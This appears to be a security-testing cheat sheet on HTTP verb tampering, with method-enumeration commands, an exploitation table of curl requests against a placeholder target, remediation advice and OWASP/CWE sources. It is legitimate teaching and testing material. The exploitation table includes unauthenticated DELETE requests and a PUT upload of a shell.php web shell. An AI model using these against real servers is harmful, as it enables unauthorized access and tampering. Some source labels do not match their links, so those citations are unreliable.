# HTTP Verb Tampering

> Bypass access control by using an HTTP method the application does not check (typically `GET`/`POST` are filtered, `HEAD`/`PUT`/`DELETE`/`OPTIONS`/`PATCH` are not). Authorized testing only.

## TL;DR
- Two failure modes: framework-level (route matches any method, ACL only checks `POST`), and server-level (Apache `<Limit GET POST>` only restricts those verbs).
- `HEAD` is the classic bypass — same routing as `GET` but no body returned; some frameworks skip authorization for HEAD.
- Map: OWASP WSTG-CONF-06 (Test HTTP Methods), WSTG-ATHZ-01 (Directory traversal / bypass authorization schema). CWE-650 Trusting HTTP Permission Methods on the Server Side.

## Detection / Discovery
```bash
# Enumerate allowed methods
curl -i -X OPTIONS https://target/admin
curl -i -X TRACE  https://target/admin
# Repeat the same protected endpoint with each verb; compare status codes and bodies.
```

| HTTP method | Description |
| --- | --- |
| `HEAD` | Same routing as GET, no body — frequently un-protected |
| `PUT` | May write content on misconfigured webdav/file APIs |
| `DELETE` | May remove records when not auth-checked |
| `OPTIONS` | CORS / method-discovery — leaks allowed methods |
| `PATCH` | Partial update; commonly skipped from method-allow-lists |

## Exploitation
| Command | Description |
| --- | --- |
| `curl -X OPTIONS https://target/admin -i` | Set HTTP Method with curl (and read `Allow:` header in response) |
| `curl -X HEAD https://target/protected -i` | Try HEAD-bypass on the protected endpoint |
| `curl -X PUT https://target/files/shell.php --data-binary @shell.php` | Upload via PUT when WebDAV misconfigured |
| `curl -X DELETE https://target/api/users/1` | Try unauth DELETE on REST routes |

## Defence / Remediation
- Authorization checks must run **before** routing dispatches to a method-specific handler — and must apply to all methods, not the ones the developer listed.
- Restrict allowed methods to the minimum (`Allow: GET, POST`); return `405 Method Not Allowed` for the rest.
- Apache: avoid `<Limit GET POST>` — use `<LimitExcept GET POST>` to deny everything else. (`<Limit>` is allow-list, the opposite of what most operators assume.)
- Disable WebDAV (`DAV off`) on production webservers unless intentionally used.
- ASVS V4.5: validate the HTTP method as part of access control.

## Sources
- OWASP WSTG-CONF-06 Test HTTP Methods: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods
- OWASP WSTG-ATHZ-01 Test Directory Traversal File Include: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include
- CWE-650 Trusting HTTP Permission Methods on the Server Side: https://cwe.mitre.org/data/definitions/650.html
- PayloadsAllTheThings Insecure Methods: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Insecure%20Direct%20Object%20References.md
